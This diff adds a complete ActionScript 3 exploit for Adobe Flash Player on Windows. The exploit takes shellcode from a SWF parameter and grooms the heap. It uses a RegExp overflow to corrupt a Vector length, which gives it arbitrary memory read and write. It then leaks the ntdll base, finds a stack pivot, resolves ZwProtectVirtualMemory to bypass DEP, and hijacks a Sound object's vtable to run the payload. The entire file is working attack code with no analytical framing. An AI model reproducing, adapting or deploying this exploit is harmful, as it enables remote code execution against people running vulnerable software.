@@ -1,0 +1,545 @@
+// Compile with: mxmlc exploit.as -o exploit.swf
+package 
+{
+	import flash.display.Sprite;
+	import flash.media.Sound;
+	import flash.utils.ByteArray;
+	import __AS3__.vec.Vector;
+	import flash.display.LoaderInfo;
+	import flash.system.Capabilities;
+	import flash.utils.Endian;
+	import __AS3__.vec.*;
+	import flash.utils.*;
+	import flash.display.*;
+	import flash.media.*;
+	import flash.system.*;
+	import flash.external.*;
+	import flash.net.*;
+	
+	public class exploit extends Sprite 
+	{
+		public var flash_version:Number;
+		public var sound_object:Sound;
+		public var byte_array:ByteArray;
+		public var massaged_memory:Vector.<Object>;
+		public var vector_object_offset_4:uint; // For overwritting and restoring purposes; float in memory needs 8 bytes
+		public var TweakedVector:Vector.<Number>;
+		public var TweakedVector_address:uint;
+		public var sound_address:uint;
+		public var sound_address_vtable:uint;
+		public var sound_address_offset_4:uint; // For overwritting and restoring purposes; float in memory needs 8 bytes
+		public var byte_array_data_address:uint;
+		public var ntdll_base:uint;
+		public var ntdll_pe_file_header:uint;
+		public var stack_pivot:uint;
+		public var virtual_alloc_address:uint;
+		public var last_leaked_address:uint;
+		public var last_leak:Vector.<uint>;
+		
+		public function exploit():void
+		{
+			this.sound_object = new Sound();
+			this.byte_array = new ByteArray();
+			this.massaged_memory = new Vector.<Object>(0);
+			this.last_leak = new Vector.<uint>(2);
+			super();
+			var loader:LoaderInfo = LoaderInfo(this.root.loaderInfo);
+			var shellcode:String = ((loader.parameters.hasOwnProperty("his")) ? loader.parameters["his"] : null);
+			if (shellcode == null){
+				return;
+			};
+			if (!this.CheckVersion()){
+				return;
+			};
+			this.ExploitIt(shellcode);
+			this.Restore();
+		}
+		
+		public function CheckVersion():Boolean
+		{
+			var capabilities:* = Capabilities.version.toLowerCase().split(" ");
+			if (capabilities[0] != "win"){
+				return (false);
+			};
+			this.flash_version = Number(capabilities[1].substr(0, 4).split(",").join(""));
+			if ((((this.flash_version < 110)) && ((this.flash_version > 115)))){
+				return (false);
+			};
+			return (true);
+		}
+		
+		public function PrepareMemoryAndOverflow():RegExp
+		{
+			var index:uint;
+			var tmp_vector:Vector.<Object>;
+			index = 0;
+			
+			while (index < 0x4000) {
+				tmp_vector = new Vector.<Object>(16);
+				tmp_vector[0] = new RegExp("sdfhefbwjghfewtyfnwgvwgbvhwasfgsvrtvcrgeeg", "");
+				tmp_vector[1] = this.CreateVectorSixteenNumbers();
+				tmp_vector[2] = this.CreateVectorSixteenNumbers();
+				tmp_vector[3] = this.CreateVectorSixteenNumbers();
+				tmp_vector[4] = this.CreateVectorSixteenNumbers();
+				tmp_vector[5] = this.CreateVectorSixteenNumbers();
+				tmp_vector[6] = this.CreateVectorSixteenNumbers();
+				tmp_vector[7] = this.CreateVectorSixteenNumbers();
+				tmp_vector[8] = this.CreateVectorSixteenNumbers();
+				tmp_vector[9] = this.CreateVectorThirtyTwoObjects();
+				tmp_vector[10] = this.CreateVectorThirtyTwoObjects();
+				tmp_vector[11] = this.CreateVectorThirtyTwoObjects();
+				tmp_vector[12] = this.CreateVectorThirtyTwoObjects();
+				tmp_vector[13] = this.CreateVectorThirtyTwoObjects();
+				tmp_vector[14] = this.CreateVectorThirtyTwoObjects();
+				tmp_vector[15] = this.CreateVectorThirtyTwoObjects();
+				this.massaged_memory[index] = tmp_vector;
+				index++;
+			};
+			index = 0x2000;
+			
+			// Make some holes
+			while (index < 0x3fff) {
+				if ((index % 2) != 0){
+					this.massaged_memory[index][2] = null;
+				};
+				index++;
+			};
+			
+			// Hopefully reuse a hole and overflow a tmp_vector[3] field
+			return (new RegExp("(?i)()()(?-i)||||||||||||||||||||||", ""));
+		}
+		
+		public function SearchOverflowedTweakAndRestore():Boolean
+		{
+			var index:uint;
+			var numbers_vector_index:uint;
+			var overflowed_vector:Vector.<Number>;
+			var fingerprint:Number;
+			index = 0;
+			_loop_1:
+			while (index < 0x4000) {
+				numbers_vector_index = 1;
+				while (numbers_vector_index < 9) {
+					try {
+						// If the length is bigger than 17, the vector's length has been overflowed
+						if ((this.massaged_memory[index][numbers_vector_index] as Vector.<Number>).length > 17){
+							overflowed_vector = (this.massaged_memory[index][numbers_vector_index] as Vector.<Number>);
+							if (this.ReadTwoUint(overflowed_vector, 17)[0] == 16) {
+								break _loop_1;
+							}
+							return (false);
+						};
+					} catch(e:Error) {
+					};
+					numbers_vector_index++;
+				};
+				index++;
+			};
+			
+			if (overflowed_vector){
+				this.vector_object_offset_4 = this.ReadTwoUint(overflowed_vector, 17)[1];
+				// Overwrite the length of the vector following the overflowed one:
+				// reused hole (vector)  ==> overflowed vector ==> corrupted (tweaked) vector
+				overflowed_vector[17] = this.TwoUintToFloat(0xFFFFFFFE, this.vector_object_offset_4);
+				// corrupts the first position of the corrupted (tweaked) vector, so we can find it
+				// in the future easily.
+				fingerprint = (overflowed_vector[18] = this.TwoUintToFloat(0x41414141, 0));				
+				index = 0;
+				while (index < 0x4000) {
+					numbers_vector_index = 1;
+					while (numbers_vector_index < 9) {
+						try {
+							// restore the overflowed vector's length
+							if ((this.massaged_memory[index][numbers_vector_index] as Vector.<Number>)[0] == fingerprint){
+								this.TweakedVector = (this.massaged_memory[index][numbers_vector_index] as Vector.<Number>);
+								this.TweakedVector[0x1fffffed] = this.TwoUintToFloat(16, this.vector_object_offset_4);
+								return (true);
+							};
+						} catch(e:Error) {
+						};
+						numbers_vector_index++;
+					};
+					index++;
+				};
+			};
+			return (false);
+		}
+		
+		public function Restore():void
+		{
+			try {
+				if (((this.TweakedVector) && (this.vector_object_offset_4))){
+					if (((this.sound_address) && (this.sound_address_vtable))){
+						this.OverwriteAddress(this.sound_address, this.sound_address_vtable, this.sound_address_offset_4);
+					};
+					this.TweakedVector[0x1fffffff] = this.TwoUintToFloat(16, this.vector_object_offset_4);
+					return;
+				};
+			} catch(e:Error) {
+			};
+			do  {
+			} while (1);
+		}
+		
+		public function GetAddressTweakedVector():Boolean
+		{
+			var index:uint;
+			var index_numbers_vectors:uint;
+			var tweaked_next:Vector.<uint>;
+			var tweaked_next_next:Vector.<uint>;
+			try {
+				index = 0;
+				// Nullify (free) number vectors who aren't the tweaked one
+				while (index < 0x4000) {
+					index_numbers_vectors = 1;
+					while (index_numbers_vectors < 9) {
+						if (this.massaged_memory[index][index_numbers_vectors] != this.TweakedVector){
+							this.massaged_memory[index][index_numbers_vectors] = null;
+						};
+						index_numbers_vectors++;
+					};
+					index++;
+				};
+				index = 1;
+				while (index < 4) {
+					tweaked_next = this.ReadTwoUint(this.TweakedVector, ((17 * index) + (index - 1)));
+					tweaked_next_next = this.ReadTwoUint(this.TweakedVector, ((17 * (index + 1)) + index));
+					// Verify that after the tweaked vector there are two more number vectors
+					// With the tweaked vector it is kinda easy to disclose its own address, becasuse
+					// Flash links vectors, so there are pointers.
+					if ((((((((((tweaked_next[1] == this.vector_object_offset_4)) && ((tweaked_next_next[1] == this.vector_object_offset_4)))) && ((tweaked_next[1] < tweaked_next[0])))) && ((tweaked_next_next[1] < tweaked_next_next[0])))) && (((tweaked_next_next[0] - tweaked_next[0]) == 144)))){
+						this.TweakedVector_address = (tweaked_next[0] - (144 * (index + 1)));
+						return (true);
+					};
+					index++;
+				};
+			} catch(e:Error) {
+			};
+			return (false);
+		}
+		
+		public function LeakObjectAddresses():Boolean
+		{
+			var one_signature:Number;
+			var i:uint;
+			var objects_leak:Vector.<uint>;
+			var byte_array_address:uint;
+			try {
+				one_signature = this.TwoUintToFloat(1, 1); // to match nil entries
+				i = 0;
+				while (i < 0x1000) {
+					// Search first objects vector entry from the tweaked one (from the massaged memory...)
+					if ((((this.ReadTwoUint(this.TweakedVector, i)[1] == 32)) && ((this.TweakedVector[(i + 1)] == one_signature)))){
+						//objects_leak[0] => ByteArray object
+						//objects_leak[1] => Sound object
+						objects_leak = this.ReadTwoUint(this.TweakedVector, (i + 2));
+						
+						this.sound_address = (objects_leak[0] & 0xFFFFFFF8);
+						this.sound_address_vtable = this.Leak(this.sound_address, true);				
+						this.sound_address_offset_4 = this.Leak((this.sound_address + 4), true);
+						
+						byte_array_address = (objects_leak[1] & 0xFFFFFFF8);
+						
+						if (this.flash_version < 114){
+							this.byte_array_data_address = this.Leak((byte_array_address + 56), true);
+							
+						} else {
+							byte_array_address = this.Leak((byte_array_address + 64), true);
+							this.byte_array_data_address = this.Leak((byte_array_address + 8), true);
+						};
+						return (true);
+					};
+					i++;
+				};
+			} catch(e:Error) {
+			};
+			return (false);
+		}
+		
+		public function Leak(address:uint, align:Boolean):uint
+		{
+			var eigth_byte_aligned:uint;
+			if (align) {
+				eigth_byte_aligned = ((((address % 8) == 0)) ? 0 : 1);
+			} else {
+				eigth_byte_aligned = 0;
+			}
+			if (eigth_byte_aligned){
+				address = (address - 4);
+			};
+			if (this.last_leaked_address == address){
+				return (this.last_leak[eigth_byte_aligned]);
+			};
+			var _local_3:uint = (((address - this.TweakedVector_address) - 8) / 8);
+			this.last_leaked_address = address;
+			this.last_leak = this.ReadTwoUint(this.TweakedVector, _local_3);
+			return (this.last_leak[eigth_byte_aligned]);
+		}
+		
+		public function OverwriteAddress(address:uint, value1:uint, value2:uint):void
+		{
+			var address_trough_tweaked:uint = (((address - this.TweakedVector_address) - 8) / 8);
+			this.TweakedVector[address_trough_tweaked] = this.TwoUintToFloat(value1, value2);
+		}
+		
+		public function LeakNtdll():Boolean
+		{
+			var ntdll_address:uint;
+			var KiFastSystemCall_address:uint;
+			var pe_file_header_address:uint;
+			try {
+				//KiFastSystemCallRet
+				KiFastSystemCall_address = this.Leak(0x7FFE0300, true);
+				if (KiFastSystemCall_address == 0){
+					KiFastSystemCall_address = this.Leak(0x7ffe0340, true);
+				};
+				if (KiFastSystemCall_address){
+					KiFastSystemCall_address = (KiFastSystemCall_address & 0xFFFF0000);
+					while (1) {
+						if ((this.Leak(KiFastSystemCall_address, true) & 0xFFFF) == 0x5a4d){ // PE signature
+							ntdll_address = KiFastSystemCall_address;
+							break;
+						};
+						KiFastSystemCall_address = (KiFastSystemCall_address - 65536);
+					};
+					if (ntdll_address){
+						pe_file_header_address = (ntdll_address + this.Leak((ntdll_address + 0x3c), true));
+						if (this.Leak(pe_file_header_address, true) == 0x4550){ // NT Header
+							this.ntdll_base = ntdll_address;
+							this.ntdll_pe_file_header = pe_file_header_address;
+							return (true);
+						};
+					};
+				};
+			} catch(e:Error) {
+			};
+			return (false);
+		}
+		
+		public function GetUint(_arg_1:uint, _arg_2:uint, _arg_3:uint):uint
+		{
+			var _local_4:uint = (_arg_1 >>> (8 * _arg_3));
+			var _local_5:uint = (((_arg_3 == 0)) ? 0 : (_arg_2 << ((4 - _arg_3) * 8)));
+			return ((_local_5 | _local_4));
+		}
+		
+		public function FindStackPivot():Boolean
+		{
+			var ntdll_size_of_code:uint;
+			var ntdll_base_of_code:uint;
+			var instr:uint;
+			var offset:uint;
+			var next_instr:uint;
+			var instr_offset:uint;
+			try {
+				ntdll_size_of_code = this.Leak((this.ntdll_pe_file_header + 0x1c), true);
+				ntdll_base_of_code = this.Leak((this.ntdll_pe_file_header + 0x2c), true);
+				if (((ntdll_size_of_code) && (ntdll_base_of_code))){
+					ntdll_base_of_code = (ntdll_base_of_code + this.ntdll_base);
+					instr = this.Leak(ntdll_base_of_code, true);
+					offset = 4;
+					while (offset < ntdll_size_of_code) {
+						next_instr = this.Leak((ntdll_base_of_code + offset), true);
+						instr_offset = 0;
+						while (instr_offset < 4) {
+							if ((this.GetUint(instr, next_instr, instr_offset) & 0xFFFF) == 0xc394){ // xcht esp, eax ; ret # 94 c3
+								this.stack_pivot = (((ntdll_base_of_code + offset) - 4) + instr_offset);
+								return (true);
+							};
+							instr_offset++;
+						};
+						instr = next_instr;
+						offset = (offset + 4);
+					};
+				};
+			} catch(e:Error) {
+			};
+			return (false);
+		}
+		
+		public function Match(address:uint, signature:Vector.<uint>, offset:uint):Boolean
+		{
+			var content_next:uint;
+			var content:uint = this.Leak(address, true);
+			var i:uint;
+			while (i < signature.length) {
+				content_next = this.Leak((address + ((i + 1) * 4)), true);
+				if (this.GetUint(content, content_next, offset) != signature[i]){
+					return (false);
+				};
+				content = content_next;
+				i++;
+			};
+			return (true);
+		}
+		
+		public function LeakVirtualProtect():Boolean
+		{
+			var exports_address:uint;
+			var virtual_protect_signature:Vector.<uint>;
+			var n_functions:uint;
+			var ptrs_entry:uint;
+			var ptrs_name:uint;
+			var ptrs_ordinal:uint;
+			var i:uint;
+			var export_name_entry:uint;
+			var offset_export_name_entry:uint;
+			var _local_10:uint;
+			
+			try {
+				exports_address = this.Leak((this.ntdll_pe_file_header + 0x78), true); // Export Data Directory Offset
+				if (exports_address){
+					exports_address = (exports_address + this.ntdll_base);
+					virtual_protect_signature = new <uint>[0x7250775a, 0x6365746f, 0x72695674]; // ZwProtectVir ; It's searching for ZwProtectVirtualMemory
+					n_functions = this.Leak((exports_address + 24), true);
+					ptrs_entry = this.Leak((exports_address + 28), true);
+					ptrs_name = this.Leak((exports_address + 32), true);
+					ptrs_ordinal = this.Leak((exports_address + 36), true);
+					if (((((((n_functions) && (ptrs_entry))) && (ptrs_name))) && (ptrs_ordinal))){
+						ptrs_entry = (ptrs_entry + this.ntdll_base);
+						ptrs_name = (ptrs_name + this.ntdll_base);
+						ptrs_ordinal = (ptrs_ordinal + this.ntdll_base);
+						i = 0;
+						while (i < n_functions) {
+							export_name_entry = this.Leak((ptrs_name + (i * 4)), true);
+							if (export_name_entry){
+								export_name_entry = (export_name_entry + this.ntdll_base);
+								offset_export_name_entry = (export_name_entry % 4);
+								export_name_entry = (export_name_entry - offset_export_name_entry);
+								if (this.Match(export_name_entry, virtual_protect_signature, offset_export_name_entry)){
+									_local_10 = this.Leak((ptrs_ordinal + ((i / 2) * 4)), false);									
+									if ((i % 2)){
+										_local_10 = (_local_10 >>> 16);
+									};
+									
+									this.virtual_alloc_address = (this.ntdll_base + this.Leak((ptrs_entry + ((_local_10 & 0xFFFF) * 4)), true));
+									return (true);
+								};
+							};
+							i++;
+						};
+					};
+				};
+			} catch(e:Error) {
+			};
+			return (false);
+		}
+		
+		public function ExploitIt(shellcode:String):void
+		{
+			var not_used:* = this.PrepareMemoryAndOverflow();
+			if (!this.SearchOverflowedTweakAndRestore()){
+				return;
+			};
+			if (!this.GetAddressTweakedVector()){
+				return;
+			};
+			if (!this.LeakNtdll()){
+				return;
+			};
+			if (!this.FindStackPivot()){
+				return;
+			};
+			if (!this.LeakVirtualProtect()){
+				return;
+			};
+			var i:uint;
+			while (i < 0x19000) {
+				this.byte_array.writeUnsignedInt(0x41424344);
+				i++;
+			};
+			this.byte_array.endian = Endian.LITTLE_ENDIAN;
+			var init_pos:uint = this.byte_array.position;
+			
+			// Write shellcode into the byte array
+			this.byte_array.position = (init_pos + 136); 			
+			this.write_into_byte_array(this.byte_array, shellcode);
+			
+			// Write stack pivot into the byte array
+			this.byte_array.position = (init_pos + 112);
+			this.byte_array.writeUnsignedInt(this.stack_pivot);
+			
+			if (!this.LeakObjectAddresses()){
+				return;
+			};
+			
+			this.byte_array_data_address = (this.byte_array_data_address + init_pos);			
+			this.byte_array.position = init_pos;
+			
+			// build ZwProtectVirtualMemory "return to ntdll attack" to bypass DEP
+			this.byte_array.writeUnsignedInt(this.virtual_alloc_address);           // ZwProtectVirtualMemory
+			this.byte_array.writeUnsignedInt((this.byte_array_data_address + 136)); // ret (shellcode address)
+			this.byte_array.writeUnsignedInt(0xFFFFFFFF);                           // ProcessHandle
+			this.byte_array.writeUnsignedInt((this.byte_array_data_address + 28));  // BaseAddress
+			this.byte_array.writeUnsignedInt((this.byte_array_data_address + 32));  // NumberOfBytesToProtect
+			this.byte_array.writeUnsignedInt(64);                                   // NewAccessProtection
+			this.byte_array.writeUnsignedInt((this.byte_array_data_address + 36));  // OldAccessProtection
+			this.byte_array.writeUnsignedInt(this.byte_array_data_address);         // this.byte_array_data_address + 28 
+			this.byte_array.writeUnsignedInt(0x1000);                               // this.byte_array_data_address + 32
+			this.byte_array.writeUnsignedInt(0x41424344);                           // this.byte_array_data_address + 36
+			
+			// Overwrite Sound...
+			this.OverwriteAddress(this.sound_address, this.byte_array_data_address, this.sound_address_offset_4);
+			
+			// Make it happen!
+			new Number(this.sound_object.toString());
+		}
+		
+		private function write_into_byte_array(byte_array:ByteArray, string:String):void
+		{
+			var _local_4:String;
+			var _local_5:int;
+			var _local_3:int;
+			while (_local_3 < string.length) {
+				_local_4 = string.substr(_local_3, 2);
+				_local_5 = parseInt(_local_4, 16);
+				byte_array.writeByte(_local_5);
+				_local_3 = (_local_3 + 2);
+			};
+		}
+		
+		private function TwoUintToFloat(_arg_1:uint, _arg_2:uint):Number
+		{
+			var result_float:ByteArray = new ByteArray();
+			result_float.endian = Endian.LITTLE_ENDIAN;
+			result_float.writeInt(_arg_1);
+			result_float.writeInt(_arg_2);
+			result_float.position = 0;
+			return (result_float.readDouble());
+		}
+		
+		// vector is a Float vectors
+		// index is the position to read from the vector
+		// read the vector[index] float i retorna els dos enters
+		// ocupant les dues posiciones
+		private function ReadTwoUint(vector:Vector.<Number>, index:uint):Vector.<uint>
+		{
+			var byte_array:ByteArray = new ByteArray();
+			byte_array.endian = Endian.BIG_ENDIAN;
+			byte_array.writeDouble(vector[index]);
+			var vector_uint:Vector.<uint> = new Vector.<uint>(2);
+			byte_array.position = 0;
+			vector_uint[1] = byte_array.readUnsignedInt();
+			vector_uint[0] = byte_array.readUnsignedInt();
+			return (vector_uint);
+		}
+		
+		private function CreateVectorThirtyTwoObjects():Vector.<Object>
+		{
+			var vector:* = new Vector.<Object>(32);
+			vector[0] = null;
+			vector[1] = null;
+			vector[2] = this.sound_object;
+			vector[3] = this.byte_array;
+			return (vector);
+		}
+		
+		private function CreateVectorSixteenNumbers():Vector.<Number>
+		{
+			var vector:* = new Vector.<Number>(16);
+			vector[0] = 0;
+			vector[15] = 1;
+			return (vector);
+		}
+	}
+}
